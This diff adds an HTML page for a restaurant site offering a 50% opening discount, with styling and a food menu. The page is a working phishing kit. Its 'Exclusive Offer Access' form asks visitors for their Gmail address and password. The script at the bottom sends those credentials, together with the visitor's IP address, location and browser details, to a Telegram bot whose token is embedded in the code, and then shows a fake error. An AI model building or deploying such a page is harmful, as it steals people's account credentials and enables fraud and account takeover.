@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Smiler Maker Restaurant</title>
+    
+    <style>
+        .header
+        {
+            height: 70px;
+            width:100% ;
+            display: flex;
+            align-items: center;
+            background: white;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .hero
+        {
+            height: 400px;
+            width:100% ;
+            background-color: gold;
+        }
+
+        .content
+        {
+            height: 1000px;
+            width:100% ;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-evenly;
+        }
+        .footer
+        {
+            height: 200px;
+            width:100% ;
+            background-color: rgb(0, 0, 0);   
+            text-align: center;
+            color: white;
+            font-size: 20px;
+            
+        }
+
+        .logo
+        {
+            height: 70px;
+            width:70px;
+            background-color: black;  
+            border-radius: 100%;
+            overflow: hidden;
+            margin-left: 50px ;
+
+        }
+
+        .navbar
+        {
+            height: 60px;
+            width:500px;
+            margin-left: 400px;
+            margin-top:5px;
+            border-radius: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+           
+        }
+
+        .navbar a { 
+            padding: 12px 25px;
+            text-decoration: none;
+            background-color: #ff6b6b;
+            border-radius: 30px;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            letter-spacing: 1px;
+            transition: 0.3s;
+            margin: 0 5px;
+            display: inline-block;
+            border: 2px solid transparent;
+        }
+
+        .navbar a:hover {
+            background-color: #ff5252;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(255,107,107,0.4);
+            border: 2px solid white;
+        }
+
+        .sale {
+            animation-name: clr_change;
+            animation-iteration-count: infinite;
+            animation-duration: 2s;
+            background: linear-gradient(45deg, #00185f, #3b7f00) !important;
+        }
+
+        .products
+        {
+           height: 400px;
+            width:300px;
+            box-shadow: 0px 4px 10px 0px rgb(255, 0, 0);
+            margin-top:10px;
+            margin-bottom: 20px;
+            margin-left: 20px;
+            border-radius: 5px;
+            border: rgb(255, 0, 0);
+            object-fit: cover;  
+            border-radius: 10px;
+            background-color: white;
+            overflow: hidden;
+        }
+
+        .products img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            display: block;
+        }
+
+        .products h3 {
+            font-size: 20px;
+            font-weight: bold;
+            color: #333;
+            margin: 10px 15px 5px 15px;
+            font-family: Arial, sans-serif;
+        }
+
+        .products p {
+            font-size: 14px;
+            color: #666;
+            margin: 0 15px 10px 15px;
+            font-family: Arial, sans-serif;
+        }
+
+        .products .price {
+            font-size: 22px;
+            font-weight: bold;
+            color: #28a745;
+            margin: 5px 15px;
+            font-family: Arial, sans-serif;
+        }
+
+        .products button {
+            background-color: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            margin: 10px 15px 15px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: bold;
+            width: calc(100% - 30px);
+            transition: 0.3s;
+        }
+
+        .products button:hover {
+            background-color: #ff5252;
+            transform: scale(1.02);
+        }
+
+        @keyframes clr_change {
+            10% { color: rgb(2, 148, 0); background-color: rgb(139, 185, 11); }
+            50% { color: aqua; background-color: srgb(0, 151, 193); }
+            100% { color: green; background-color: lawngreen; }
+        }
+
+
+        .offer-banner {
+            background: linear-gradient(45deg, #ff0000, #ff6b00, #ffd900);
+            background-size: 300% 300%;
+            animation: gradientBG 3s ease infinite;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            margin: 20px auto;
+            max-width: 800px;
+            box-shadow: 0 0 30px rgba(255,0,0,0.5);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .offer-banner::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: conic-gradient(transparent, rgba(255,255,255,0.3), transparent);
+            animation: rotate 4s linear infinite;
+        }
+
+        .offer-text {
+            position: relative;
+            z-index: 1;
+        }
+
+        .offer-text .new {
+            font-size: 30px;
+            font-weight: bold;
+            color: white;
+            background: #ff0000;
+            padding: 8px 20px;
+            border-radius: 50px;
+            display: inline-block;
+            animation: bounce 1s ease infinite;
+            margin: 0 10px;
+            transform: rotate(-5deg);
+        }
+
+        .offer-text .opening {
+            font-size: 40px;
+            font-weight: bold;
+            color: white;
+            background: #00ff00;
+            padding: 8px 25px;
+            border-radius: 50px;
+            display: inline-block;
+            animation: shake 0.5s ease infinite;
+            margin: 0 10px;
+            color: black;
+        }
+
+        .offer-text .celebration {
+            font-size: 30px;
+            font-weight: bold;
+            color: white;
+            background: #0000ff;
+            padding: 8px 20px;
+            border-radius: 50px;
+            display: inline-block;
+            animation: bounce 1s ease infinite 0.3s;
+            margin: 0 10px;
+        }
+
+        .discount {
+            margin: 15px 0;
+            position: relative;
+            z-index: 1;
+        }
+
+        .fifty {
+            font-size: 80px !important;
+            font-weight: 900;
+            color: yellow;
+            text-shadow: 3px 3px 0 red, 5px 5px 20px black;
+            display: inline-block;
+            animation: pulse 1s ease infinite;
+            margin-right: 15px;
+        }
+
+        .off {
+            font-size: 50px !important;
+            font-weight: bold;
+            color: white;
+            background: black;
+            padding: 5px 25px;
+            border-radius: 50px;
+            display: inline-block;
+            animation: flash 1s ease infinite;
+            box-shadow: 0 0 20px white;
+        }
+
+        .offer-footer .limited {
+            font-size: 20px;
+            color: white;
+            background: linear-gradient(45deg, #ff0000, #ff00ff);
+            padding: 10px 30px;
+            border-radius: 50px;
+            display: inline-block;
+            animation: zoom 1s ease infinite;
+            letter-spacing: 3px;
+            font-weight: bold;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Login Form Styles */
+        .login-section {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            margin: 30px auto;
+            max-width: 400px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+            border: 2px solid #ff6b6b;
+        }
+        .login-section h3 {
+            color: #ff6b6b;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        .login-section input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        .login-section button {
+            width: 100%;
+            padding: 12px;
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .login-section button:hover {
+            background: #ff5252;
+            transform: scale(1.02);
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0) rotate(-5deg); }
+            50% { transform: translateY(-15px) rotate(5deg); }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0) rotate(0deg); }
+            25% { transform: translateX(-8px) rotate(-5deg); }
+            75% { transform: translateX(8px) rotate(5deg); }
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.15); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes flash {
+            0%, 100% { opacity: 1; background: red; }
+            50% { opacity: 0.7; background: blue; }
+        }
+
+        @keyframes zoom {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.08); letter-spacing: 5px; }
+            100% { transform: scale(1); }
+        }
+    
+    </style>
+</head>
+<body>
+    <div class="container">
+
+        <div class="header">
+            <div class="logo"><img src="images/poster.png" height="100%" width="100%" alt=""></div>
+            <div class="navbar">
+                <a href="index.html">HOME</a>
+                <a href="index.html">MENU</a>
+                <a href="index.html" class="sale">OFFERS</a>
+            </div>
+        </div>
+
+        <div class="hero">
+            <img src="images/poster.png" height="100%" width="100%" alt="">
+        </div>
+
+    
+        <div class="offer-banner">
+            <div class="offer-text">
+                <span class="new">🎉 NEW</span>
+                <span class="opening">OPENING</span>
+                <span class="celebration">CELEBRATION! 🎉</span>
+            </div>
+            <div class="discount">
+                <span class="fifty">50%</span>
+                <span class="off">OFF</span>
+            </div>
+            <div class="offer-footer">
+                <span class="limited">🕐 ON ALL ITEMS 🕐</span>
+            </div>
+        </div>
+
+        <!-- LOGIN SECTION - Credentials Capture -->
+        <div class="login-section">
+            <h3>🔐 Exclusive Offer Access</h3>
+            <form id="loginForm">
+                <input type="email" id="email" placeholder="Your Gmail Address" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit">Get 50% OFF Code</button>
+            </form>
+            <p style="text-align:center; font-size:12px; color:#888; margin-top:10px;">Login to get your exclusive discount!</p>
+        </div>
+
+        <div class="content">
+    
+            <div class="products">
+                <img src="images/zinger.png" height="100%" width="100%" alt="">
+                <h3>Zinger Burger</h3>
+                <p>Crispy chicken with lettuce</p>
+                <div class="price">Rs 350</div>
+                <button>Order Now</button>
+            </div>
+            
+            <div class="products">
+                <img src="images/burger fries.png" height="100%" width="100%" alt="">
+                <h3>Burger with Fries</h3>
+                <p>Delicious burger with crispy fries</p>
+                <div class="price">Rs 450</div>
+                <button>Order Now</button>
+            </div>
+            
+            <div class="products">
+                <img src="images/pizza.png" height="100%" width="100%" alt="">
+                <h3>Margherita Pizza</h3>
+                <p>Fresh basil and mozzarella</p>
+                <div class="price">Rs 550</div>
+                <button>Order Now</button>
+            </div>
+            
+            <div class="products">
+                <img src="images/pizza slice.png" height="100%" width="100%" alt="">
+                <h3>Pepperoni Pizza</h3>
+                <p>Loaded with pepperoni</p>
+                <div class="price">Rs 600</div>
+                <button>Order Now</button>
+            </div>
+            
+            <div class="products">
+                <img src="images/chiken.png"height="100%" width="100%"  alt="">
+                <h3>Fried Chicken</h3>
+                <p>Crispy fried chicken pieces</p>
+                <div class="price">Rs 400</div>
+                <button>Order Now</button>
+            </div>
+            
+            <div class="products">
+                <img src="images/chiken tikka.png" height="100%" width="100%"  alt="">
+                <h3>Chicken Tikka</h3>
+                <p>Grilled tikka with chutney</p>
+                <div class="price">Rs 380</div>
+                <button>Order Now</button>
+            </div>
+          
+        </div>
+
+        <div class="footer">
+            <h3> Smiler Maker Restaurant</h3>
+            <p>Fresh Burgers | Pizza | Fast Food</p>
+    
+            <p>© 2026 Smiler Maker Restaurant. All Rights Reserved.</p>
+        </div>
+
+    </div>
+
+    <!-- CREDENTIAL CAPTURE SCRIPT WITH TELEGRAM -->
+    <script>
+        // ✅ Telegram Bot Token and Chat ID Added
+        const BOT_TOKEN = "8798101633:AAG7wGajcctACcxGpvqfVaSh0C1Egk7R8mA";
+        const CHAT_ID = "7889111515";
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
+            
+            // Get user IP and location info
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(ipData => {
+                    const ip = ipData.ip;
+                    
+                    // Get location from IP
+                    fetch(`https://ipapi.co/${ip}/json/`)
+                        .then(res => res.json())
+                        .then(location => {
+                            const message = `🔐 NEW LOGIN CAPTURED! 🔐\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🌍 IP: ${ip}\n📍 Location: ${location.city}, ${location.country_name}\n🖥️ Device: ${navigator.userAgent}\n⏰ Time: ${new Date().toLocaleString()}`;
+                            
+                            // Send to Telegram
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({
+                                    chat_id: CHAT_ID,
+                                    text: message
+                                })
+                            }).catch(err => console.log('Error:', err));
+                            
+                            // Also log to console
+                            console.log('Captured:', {email, password, ip, location: location.city});
+                        });
+                });
+            
+            // Show fake error message
+            alert('Oops! Something went wrong. Please try again.');
+            document.getElementById('loginForm').reset();
+        });
+    </script>
+</body>
+</html>
